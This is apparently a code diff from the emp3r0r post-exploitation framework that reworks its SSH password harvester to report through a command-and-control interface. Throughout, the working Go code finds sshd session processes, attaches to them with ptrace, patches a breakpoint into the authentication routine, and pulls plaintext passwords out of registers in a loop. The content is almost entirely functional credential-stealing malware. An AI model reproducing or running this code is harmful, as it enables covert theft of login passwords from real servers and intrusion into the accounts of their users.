@@ -16,10 +16,15 @@ import (
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
+	"github.com/spf13/cobra"
 	"golang.org/x/sys/unix"
 )
 
 var (
+	// mark ssh harvester as running
+	sshHarvesterRunning bool
+
+	// record traced sshd sessions
 	traced_pids     = make(map[int]bool)
 	traced_pids_mut = &sync.RWMutex{}
 
@@ -28,19 +33,30 @@ var (
 	SshHarvesterCancel context.CancelFunc
 )
 
-func sshd_monitor(logStream chan string, code_pattern []byte, reg_name string) (err error) {
-	defer util.LogStreamPrintf(logStream, "SSH Harvester main process (%d): done", unix.Getpid())
+func ssh_harvester(cmd *cobra.Command, code_pattern []byte, reg_name string) (err error) {
+	if sshHarvesterRunning {
+		C2RespPrintf(cmd, "SSH Harvester already running")
+		return
+	} else {
+		// initialize context
+		SshHarvesterCtx, SshHarvesterCancel = context.WithCancel(context.Background())
+	}
+	defer func() {
+		C2RespPrintf(cmd, "SSH Harvester (%d) terminated", unix.Getpid())
+		sshHarvesterRunning = false // mark as finished
+	}()
 
 	alive, sshd_procs := util.IsProcAlive("sshd")
 	if !alive {
-		util.LogStreamPrintf(logStream, "sshd_monitor (%d): sshd process not found, aborting", unix.Getpid())
+		C2RespPrintf(cmd, "SSH Harvester (%d): sshd service process not found, aborting", unix.Getpid())
 		return
 	}
 
-	util.LogStreamPrintf(logStream, "sshd_monitor started (%d)", unix.Getpid())
+	C2RespPrintf(cmd, "SSH harvester started (%d) with code pattern set to 0x%x", unix.Getpid(), code_pattern)
+	sshHarvesterRunning = true // mark as running
 	monitor := func(sshd_pid int) {
-		util.LogStreamPrintf(logStream, "Started monitor (%d) on SSHD (%d)", unix.Getpid(), sshd_pid)
-		defer util.LogStreamPrintf(logStream, "Monitor for %d done", sshd_pid)
+		C2RespPrintf(cmd, "Started monitor (%d) on SSHD session process (%d), looking for code pattern 0x%x", unix.Getpid(), sshd_pid, code_pattern)
+		defer C2RespPrintf(cmd, "Monitor for %d done", sshd_pid)
 		for SshHarvesterCtx.Err() == nil {
 			util.TakeABlink()
 			children_file := fmt.Sprintf("/proc/%d/task/%d/children", sshd_pid, sshd_pid)
@@ -54,7 +70,7 @@ func sshd_monitor(logStream chan string, code_pattern []byte, reg_name string) (
 				if err == nil {
 					traced_pids_mut.RLock()
 					if !traced_pids[child_pid] {
-						go sshd_harvester(child_pid, logStream, code_pattern, reg_name)
+						go sshd_harvester(child_pid, cmd, code_pattern, reg_name)
 					}
 					traced_pids_mut.RUnlock()
 				}
@@ -63,20 +79,19 @@ func sshd_monitor(logStream chan string, code_pattern []byte, reg_name string) (
 	}
 	for _, sshd_proc := range sshd_procs {
 		if SshHarvesterCtx.Err() == nil {
-			util.LogStreamPrintf(logStream, "Starting monitor (%d) on SSHD (%d)", unix.Getpid(), sshd_proc.Pid)
 			go monitor(int(sshd_proc.Pid))
 		}
 	}
 
 	for SshHarvesterCtx.Err() == nil {
-		util.TakeASnap()
+		util.TakeABlink()
 	}
 
 	return
 }
 
-func sshd_harvester(pid int, logStream chan string, code_pattern []byte, reg_name string) {
-	defer util.LogStreamPrintf(logStream, "SSH harvester for sshd session %d done", pid)
+func sshd_harvester(pid int, cmd *cobra.Command, code_pattern []byte, reg_name string) {
+	defer C2RespPrintf(cmd, "SSH harvester for sshd session %d done", pid)
 
 	// remember pid
 	traced_pids_mut.Lock()
@@ -90,11 +105,11 @@ func sshd_harvester(pid int, logStream chan string, code_pattern []byte, reg_nam
 		code_pattern = []byte{0x48, 0x83, 0xc4, 0x08, 0x0f, 0xb6, 0xc0, 0x21}
 	}
 	// code_pattern_littleendian := []byte{0x21, 0xc0, 0xb6, 0x0f, 0x08, 0xc4, 0x83, 0x48}
-	util.LogStreamPrintf(logStream, "\n[+] Starting Harvester for SSHD session %d", pid)
+	C2RespPrintf(cmd, "\n[+] Starting Harvester for SSHD session %d", pid)
 	map_file := fmt.Sprintf("/proc/%d/maps", pid)
 	map_data, err := os.ReadFile(map_file)
 	if err != nil {
-		util.LogStreamPrintf(logStream, "Failed to read memory map of %d: %v", pid, err)
+		C2RespPrintf(cmd, "Failed to read memory map of %d: %v", pid, err)
 		return
 	}
 	// parse memory map
@@ -108,25 +123,25 @@ func sshd_harvester(pid int, logStream chan string, code_pattern []byte, reg_nam
 			strings.Contains(line, "r-x") {
 			f1 := strings.Fields(line)[0]
 			if len(f1) < 2 {
-				util.LogStreamPrintf(logStream, "error parsing line: %s", line)
+				C2RespPrintf(cmd, "error parsing line: %s", line)
 				continue
 			}
 			start := strings.Split(f1, "-")[0]
 			end := strings.Split(f1, "-")[1]
 			ptr, err = strconv.ParseUint(start, 16, 64)
 			if err != nil {
-				util.LogStreamPrintf(logStream, "parsing pstart: %v", err)
+				C2RespPrintf(cmd, "parsing pstart: %v", err)
 				return
 			}
 			pend, err = strconv.ParseUint(end, 16, 64)
 			if err != nil {
-				util.LogStreamPrintf(logStream, "parsing pend: %v", err)
+				C2RespPrintf(cmd, "parsing pend: %v", err)
 				return
 			}
 		}
 	}
-	util.LogStreamPrintf(logStream, "Harvester PID is %d", unix.Getpid())
-	util.LogStreamPrintf(logStream, "SSHD process found in 0x%x - 0x%x", ptr, pend)
+	C2RespPrintf(cmd, "Harvester PID is %d", unix.Getpid())
+	C2RespPrintf(cmd, "SSHD process found in 0x%x - 0x%x", ptr, pend)
 	pstart := ptr
 
 	// #13 https://github.com/jm33-m0/emp3r0r/issues/13
@@ -136,7 +151,7 @@ func sshd_harvester(pid int, logStream chan string, code_pattern []byte, reg_nam
 	defer runtime.UnlockOSThread()
 	err = unix.PtraceAttach(pid)
 	if err != nil {
-		util.LogStreamPrintf(logStream, "failed to attach to %d: %v", pid, err)
+		C2RespPrintf(cmd, "failed to attach to %d: %v", pid, err)
 		return
 	}
 	defer unix.PtraceDetach(pid)
@@ -144,41 +159,41 @@ func sshd_harvester(pid int, logStream chan string, code_pattern []byte, reg_nam
 	wstatus := new(unix.WaitStatus)
 	_, err = unix.Wait4(pid, wstatus, 0, nil)
 	if err != nil {
-		util.LogStreamPrintf(logStream, "wait %d: %v", pid, err)
+		C2RespPrintf(cmd, "wait %d: %v", pid, err)
 		return
 	}
 	switch {
 	case wstatus.Exited():
-		util.LogStreamPrintf(logStream, "SSHD %d exited...", pid)
+		C2RespPrintf(cmd, "SSHD %d exited...", pid)
 		return
 	case wstatus.CoreDump():
-		util.LogStreamPrintf(logStream, "SSHD %d core dumped...", pid)
+		C2RespPrintf(cmd, "SSHD %d core dumped...", pid)
 	case wstatus.Continued():
-		util.LogStreamPrintf(logStream, "SSHD %d continues...", pid)
+		C2RespPrintf(cmd, "SSHD %d continues...", pid)
 	case wstatus.Stopped():
-		util.LogStreamPrintf(logStream, "SSHD %d has stopped on attach...", pid)
+		C2RespPrintf(cmd, "SSHD %d has stopped on attach...", pid)
 	}
 	word := make([]byte, 8)
-	util.LogStreamPrintf(logStream, "We (%d) are now tracing sshd session (%d)", unix.Getpid(), pid)
+	C2RespPrintf(cmd, "We (%d) are now tracing sshd session (%d)", unix.Getpid(), pid)
 
 	// search for auth_password
-	util.LogStreamPrintf(logStream, "Searching for auth_password")
+	C2RespPrintf(cmd, "Searching for auth_password")
 	for ptr < pend {
 		_, err := unix.PtracePeekText(pid, uintptr(ptr), word)
 		if err != nil {
-			util.LogStreamPrintf(logStream, "PTRACE_PEEKTEXT searching memory of %d: %v",
+			C2RespPrintf(cmd, "PTRACE_PEEKTEXT searching memory of %d: %v",
 				pid, err)
 			time.Sleep(time.Second)
 		}
 		if bytes.Equal(word, code_pattern) {
-			util.LogStreamPrintf(logStream, "Got a hit (0x%x) at 0x%x", word, ptr)
+			C2RespPrintf(cmd, "Got a hit (0x%x) at 0x%x", word, ptr)
 			// now pstart is the start of our code pattern
 			break
 		}
 		ptr++
 	}
 	if ptr == pend {
-		util.LogStreamPrintf(logStream, "code pattern 0x%x not found in memory 0x%x to 0x%x",
+		C2RespPrintf(cmd, "code pattern 0x%x not found in memory 0x%x to 0x%x",
 			code_pattern, pstart, pend)
 		return
 	}
@@ -186,14 +201,14 @@ func sshd_harvester(pid int, logStream chan string, code_pattern []byte, reg_nam
 	// points to the start of our code pattern
 	pcode_pattern := uintptr(ptr)
 	// dump code at code pattern
-	util.LogStreamPrintf(logStream, "Code pattern found at 0x%x", pcode_pattern)
-	dump_code(pid, pcode_pattern, logStream)
+	C2RespPrintf(cmd, "Code pattern found at 0x%x", pcode_pattern)
+	dump_code(pid, pcode_pattern, cmd)
 
 	// before breakpoint, what does the code look like
-	util.LogStreamPrintf(logStream, "Before setting the breakpoint, what does the code look like?")
-	regs := dump_regs(pid, logStream)
+	C2RespPrintf(cmd, "Before setting the breakpoint, what does the code look like?")
+	regs := dump_regs(pid, cmd)
 	if regs != nil {
-		dump_code(pid, uintptr(regs.Rip), logStream)
+		dump_code(pid, uintptr(regs.Rip), cmd)
 	}
 
 	// write breakpoint
@@ -201,37 +216,37 @@ func sshd_harvester(pid int, logStream chan string, code_pattern []byte, reg_nam
 	copy(code_with_trap, code_pattern)
 	code_with_trap[0] = 0xCC
 	// code_with_trap[len(code_with_trap)-1] = 0xCC
-	util.LogStreamPrintf(logStream, "Patching code 0x%x to 0x%x", code_pattern, code_with_trap)
+	C2RespPrintf(cmd, "Patching code 0x%x to 0x%x", code_pattern, code_with_trap)
 	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
 	if err != nil {
-		util.LogStreamPrintf(logStream, "patching code: %v", err)
+		C2RespPrintf(cmd, "patching code: %v", err)
 		return
 	}
-	util.LogStreamPrintf(logStream, "INT3 written, breakpoint set")
-	util.LogStreamPrintf(logStream, "Dumping code at code pattern 0x%x to check if bp has been set", pcode_pattern)
-	dump_code(pid, pcode_pattern, logStream)
-	util.LogStreamPrintf(logStream, "Resuming process to let it hit breakpoint")
+	C2RespPrintf(cmd, "INT3 written, breakpoint set")
+	C2RespPrintf(cmd, "Dumping code at code pattern 0x%x to check if bp has been set", pcode_pattern)
+	dump_code(pid, pcode_pattern, cmd)
+	C2RespPrintf(cmd, "Resuming process to let it hit breakpoint")
 	err = unix.PtraceCont(pid, int(unix.SIGCONT))
 	if err != nil {
-		util.LogStreamPrintf(logStream, "resuming process: %v", err)
+		C2RespPrintf(cmd, "resuming process: %v", err)
 		return
 	}
 	_, err = unix.Wait4(pid, wstatus, 0, nil)
 	if err != nil {
-		util.LogStreamPrintf(logStream, "wait %d to hit breakpoint: %v", pid, err)
+		C2RespPrintf(cmd, "wait %d to hit breakpoint: %v", pid, err)
 		return
 	}
 	switch {
 	case wstatus.Exited():
-		util.LogStreamPrintf(logStream, "SSHD %d exited...", pid)
+		C2RespPrintf(cmd, "SSHD %d exited...", pid)
 		return
 	case wstatus.CoreDump():
-		util.LogStreamPrintf(logStream, "SSHD %d core dumped...", pid)
+		C2RespPrintf(cmd, "SSHD %d core dumped...", pid)
 		return
 	case wstatus.Continued():
-		util.LogStreamPrintf(logStream, "SSHD %d continues...", pid)
+		C2RespPrintf(cmd, "SSHD %d continues...", pid)
 	case wstatus.Stopped():
-		util.LogStreamPrintf(logStream, "SSHD %d has hit breakpoint", pid)
+		C2RespPrintf(cmd, "SSHD %d has hit breakpoint", pid)
 	}
 
 handler:
@@ -240,96 +255,96 @@ handler:
 	regs = new(unix.PtraceRegs)
 	err = unix.PtraceGetRegs(pid, regs)
 	if err != nil {
-		util.LogStreamPrintf(logStream, "get regs: %v", err)
+		C2RespPrintf(cmd, "get regs: %v", err)
 		return
 	}
 	pam_ret := regs.Rax
 	// where are we at
-	util.LogStreamPrintf(logStream, "Dumping code at RIP after hitting breakpoint")
-	dump_code(pid, uintptr(regs.Rip), logStream)
+	C2RespPrintf(cmd, "Dumping code at RIP after hitting breakpoint")
+	dump_code(pid, uintptr(regs.Rip), cmd)
 
 	// read password from given register name
-	password_bytes := read_reg_val(pid, reg_name, logStream)
-	util.LogStreamPrintf(logStream, "Extracting password from %s", reg_name)
+	password_bytes := read_reg_val(pid, reg_name, cmd)
+	C2RespPrintf(cmd, "Extracting password from %s", reg_name)
 	password := string(password_bytes)
 	if pam_ret == 0 {
-		util.LogStreamPrintf(logStream, "RAX=0x%x, password 0x%x (%s) is invalid", pam_ret, password, password)
+		C2RespPrintf(cmd, "RAX=0x%x, password 0x%x (%s) is invalid", pam_ret, password, password)
 	} else {
 		success = true
-		util.LogStreamPrintf(logStream, "\n\nWe have password 0x%x (%s)\n\n", password, password)
+		C2RespPrintf(cmd, "\n\nWe have password 0x%x (%s)\n\n", password, password)
 	}
 	if password != "" {
 		success = true
 		passwords = append(passwords, password)
 	}
 	// remove breakpoint
-	util.LogStreamPrintf(logStream, "Removing breakpoint")
+	C2RespPrintf(cmd, "Removing breakpoint")
 	_, err = unix.PtracePokeText(pid, pcode_pattern, code_pattern)
 	if err != nil {
-		util.LogStreamPrintf(logStream, "restoring code to remove breakpoint: %v", err)
+		C2RespPrintf(cmd, "restoring code to remove breakpoint: %v", err)
 		return
 	}
 	// one byte back, go back before 0xCC, at the start of code pattern
 	regs.Rip--
-	util.LogStreamPrintf(logStream, "Setting RIP back one byte to 0x%x", regs.Rip)
+	C2RespPrintf(cmd, "Setting RIP back one byte to 0x%x", regs.Rip)
 	err = unix.PtraceSetRegs(pid, regs)
 	if err != nil {
-		util.LogStreamPrintf(logStream, "set regs back: %v", err)
+		C2RespPrintf(cmd, "set regs back: %v", err)
 		return
 	}
-	dump_code(pid, uintptr(regs.Rip), logStream)
+	dump_code(pid, uintptr(regs.Rip), cmd)
 
 	// single step to execute original code
 	err = unix.PtraceSingleStep(pid)
 	if err != nil {
-		util.LogStreamPrintf(logStream, "single step: %v", err)
+		C2RespPrintf(cmd, "single step: %v", err)
 		return
 	}
 	_, err = unix.Wait4(pid, wstatus, 0, nil)
 	if err != nil {
-		util.LogStreamPrintf(logStream, "wait %d to single step: %v", pid, err)
+		C2RespPrintf(cmd, "wait %d to single step: %v", pid, err)
 		return
 	}
-	util.LogStreamPrintf(logStream, "Single step done")
+	C2RespPrintf(cmd, "Single step done")
 
 	// check if breakpoint is removed
-	util.LogStreamPrintf(logStream, "Dumping code at code pattern 0x%x to check if bp has been removed", pcode_pattern)
-	dump_code(pid, pcode_pattern, logStream)
-	util.LogStreamPrintf(logStream, "Breakpoint should now be removed: 0x%x, sshd will proceed", word)
+	C2RespPrintf(cmd, "Dumping code at code pattern 0x%x to check if bp has been removed", pcode_pattern)
+	dump_code(pid, pcode_pattern, cmd)
+	C2RespPrintf(cmd, "Breakpoint should now be removed: 0x%x, sshd will proceed", word)
 
 	// add breakpoint back
 	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
 	if err != nil {
-		util.LogStreamPrintf(logStream, "patching code: %v", err)
+		C2RespPrintf(cmd, "patching code: %v", err)
 		return
 	}
-	util.LogStreamPrintf(logStream, "Added breakpoint back")
+	C2RespPrintf(cmd, "Added breakpoint back")
 
 	// continue sshd session process
 	err = unix.PtraceCont(pid, int(unix.SIGCONT))
 	if err != nil {
-		util.LogStreamPrintf(logStream, "continue SSHD session: %v", err)
+		C2RespPrintf(cmd, "continue SSHD session: %v", err)
 		return
 	}
 	_, err = unix.Wait4(pid, wstatus, 0, nil)
 	if err != nil {
-		util.LogStreamPrintf(logStream, "wait %d to continue: %v", pid, err)
+		C2RespPrintf(cmd, "wait %d to continue: %v", pid, err)
 		return
 	}
 	switch {
 	case wstatus.Stopped():
 		if !success {
-			util.LogStreamPrintf(logStream, "SSHD %d stopped, but no password found, let's keep the bp and try again", pid)
+			C2RespPrintf(cmd, "SSHD %d stopped, but no password found, let's keep the bp and try again", pid)
 			goto handler
 		}
 	case wstatus.Exited():
-		util.LogStreamPrintf(logStream, "SSHD %d exited...", pid)
+		C2RespPrintf(cmd, "SSHD %d exited...", pid)
 	case wstatus.CoreDump():
-		util.LogStreamPrintf(logStream, "SSHD %d core dumped...", pid)
+		C2RespPrintf(cmd, "SSHD %d core dumped...", pid)
 	case wstatus.Continued():
-		util.LogStreamPrintf(logStream, "SSHD %d core continues...", pid)
+		C2RespPrintf(cmd, "SSHD %d core continues...", pid)
 	default:
-		util.LogStreamPrintf(logStream, "uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
+		C2RespPrintf(cmd, "uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
 	}
 
 	res := make([]string, 1)
@@ -339,74 +354,74 @@ handler:
 		}
 	}
 
-	util.LogStreamPrintf(logStream, "SSHD session %d done, passwords are %s", pid, res)
+	C2RespPrintf(cmd, "SSHD session %d done, passwords are %s", pid, res)
 }
 
 // dump registers' values and the registers themselves
-func dump_regs(pid int, log_stream chan string) (regs *unix.PtraceRegs) {
+func dump_regs(pid int, cmd *cobra.Command) (regs *unix.PtraceRegs) {
 	regs = new(unix.PtraceRegs)
 	err := unix.PtraceGetRegs(pid, regs)
 	if err != nil {
-		util.LogStreamPrintf(log_stream, "dump code for %d failed: %v", pid, err)
+		C2RespPrintf(cmd, "dump code for %d failed: %v", pid, err)
 		return
 	}
 
 	// dump reg values
-	rax := read_reg_val(pid, "RAX", log_stream)
-	rdi := read_reg_val(pid, "RDI", log_stream)
-	rsi := read_reg_val(pid, "RSI", log_stream)
-	rdx := read_reg_val(pid, "RDX", log_stream)
-	rcx := read_reg_val(pid, "RCX", log_stream)
-	r8 := read_reg_val(pid, "R8", log_stream)
-	r9 := read_reg_val(pid, "R9", log_stream)
-	rbp := read_reg_val(pid, "RBP", log_stream)
-	rsp := read_reg_val(pid, "RSP", log_stream)
-	util.LogStreamPrintf(log_stream, "RAX=%s, RDI=%s, RSI=%s, RDX=%s, RCX=%s, R8=%s, R9=%s, RBP=%s, RSP=%s", rax, rdi, rsi, rdx, rcx, r8, r9, rbp, rsp)
+	rax := read_reg_val(pid, "RAX", cmd)
+	rdi := read_reg_val(pid, "RDI", cmd)
+	rsi := read_reg_val(pid, "RSI", cmd)
+	rdx := read_reg_val(pid, "RDX", cmd)
+	rcx := read_reg_val(pid, "RCX", cmd)
+	r8 := read_reg_val(pid, "R8", cmd)
+	r9 := read_reg_val(pid, "R9", cmd)
+	rbp := read_reg_val(pid, "RBP", cmd)
+	rsp := read_reg_val(pid, "RSP", cmd)
+	C2RespPrintf(cmd, "RAX=%s, RDI=%s, RSI=%s, RDX=%s, RCX=%s, R8=%s, R9=%s, RBP=%s, RSP=%s", rax, rdi, rsi, rdx, rcx, r8, r9, rbp, rsp)
 
 	return
 }
 
 // read register value, return printable text or hex string
-func read_reg_val(pid int, reg_name string, log_stream chan string) (val []byte) {
+func read_reg_val(pid int, reg_name string, cmd *cobra.Command) (val []byte) {
 	regs := new(unix.PtraceRegs)
 	err := unix.PtraceGetRegs(pid, regs)
 	if err != nil {
-		util.LogStreamPrintf(log_stream, "dump code for %d failed: %v", pid, err)
+		C2RespPrintf(cmd, "dump code for %d failed: %v", pid, err)
 		return
 	}
 	switch reg_name {
 	case "RAX":
-		val = peek_text(pid, uintptr(regs.Rax), log_stream, true)
+		val = peek_text(pid, uintptr(regs.Rax), cmd, true)
 	case "RDI":
-		val = peek_text(pid, uintptr(regs.Rdi), log_stream, true)
+		val = peek_text(pid, uintptr(regs.Rdi), cmd, true)
 	case "RSI":
-		val = peek_text(pid, uintptr(regs.Rsi), log_stream, true)
+		val = peek_text(pid, uintptr(regs.Rsi), cmd, true)
 	case "RDX":
-		val = peek_text(pid, uintptr(regs.Rdx), log_stream, true)
+		val = peek_text(pid, uintptr(regs.Rdx), cmd, true)
 	case "RCX":
-		val = peek_text(pid, uintptr(regs.Rcx), log_stream, true)
+		val = peek_text(pid, uintptr(regs.Rcx), cmd, true)
 	case "R8":
-		val = peek_text(pid, uintptr(regs.R8), log_stream, true)
+		val = peek_text(pid, uintptr(regs.R8), cmd, true)
 	case "R9":
-		val = peek_text(pid, uintptr(regs.R9), log_stream, true)
+		val = peek_text(pid, uintptr(regs.R9), cmd, true)
 	case "RBP":
-		val = peek_text(pid, uintptr(regs.Rbp), log_stream, true)
+		val = peek_text(pid, uintptr(regs.Rbp), cmd, true)
 	case "RSP":
-		val = peek_text(pid, uintptr(regs.Rsp), log_stream, true)
+		val = peek_text(pid, uintptr(regs.Rsp), cmd, true)
 	}
 	return
 }
 
 // read memory at addr and check if it's printable, 24 bytes at most
-func peek_text(pid int, addr uintptr, log_stream chan string, ensure_printable bool) (read_bytes []byte) {
+func peek_text(pid int, addr uintptr, cmd *cobra.Command, ensure_printable bool) (read_bytes []byte) {
 	if addr == 0 {
-		util.LogStreamPrintf(log_stream, "Invalid address 0x%x", addr)
+		C2RespPrintf(cmd, "Invalid address 0x%x", addr)
 		return
 	}
 	read_bytes = make([]byte, 24)
 	_, err := unix.PtracePeekText(pid, addr, read_bytes)
 	if err != nil {
-		util.LogStreamPrintf(log_stream, "PEEKTEXT: %v", err)
+		C2RespPrintf(cmd, "PEEKTEXT: %v", err)
 		return
 	}
 	if !ensure_printable {
@@ -420,19 +435,19 @@ func peek_text(pid int, addr uintptr, log_stream chan string, ensure_printable b
 	return []byte(res_str)
 }
 
-func dump_code(pid int, addr uintptr, log_stream chan string) {
-	code_bytes := peek_text(pid, addr, log_stream, false)
+func dump_code(pid int, addr uintptr, cmd *cobra.Command) {
+	code_bytes := peek_text(pid, addr, cmd, false)
 	if len(code_bytes) == 0 {
 		return
 	}
-	util.LogStreamPrintf(log_stream, "Code at 0x%x: %x", addr, code_bytes)
+	C2RespPrintf(cmd, "Code at 0x%x: %x", addr, code_bytes)
 }
 
-func get_tracer_pid(pid int, log_stream chan string) (tracer_pid int) {
+func get_tracer_pid(pid int, cmd *cobra.Command) (tracer_pid int) {
 	// check tracer pid
 	proc_status, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
 	if err != nil {
-		util.LogStreamPrintf(log_stream, "get_tracer: %v", err)
+		C2RespPrintf(cmd, "get_tracer: %v", err)
 		return
 	}
 	lines := strings.Split(string(proc_status), "\n")
@@ -441,7 +456,7 @@ func get_tracer_pid(pid int, log_stream chan string) (tracer_pid int) {
 			tracer := strings.Fields(line)[1]
 			tracer_pid, err = strconv.Atoi(tracer)
 			if err != nil {
-				util.LogStreamPrintf(log_stream, "Invalid tracer PID: %v", err)
+				C2RespPrintf(cmd, "Invalid tracer PID: %v", err)
 				return
 			}
 			break
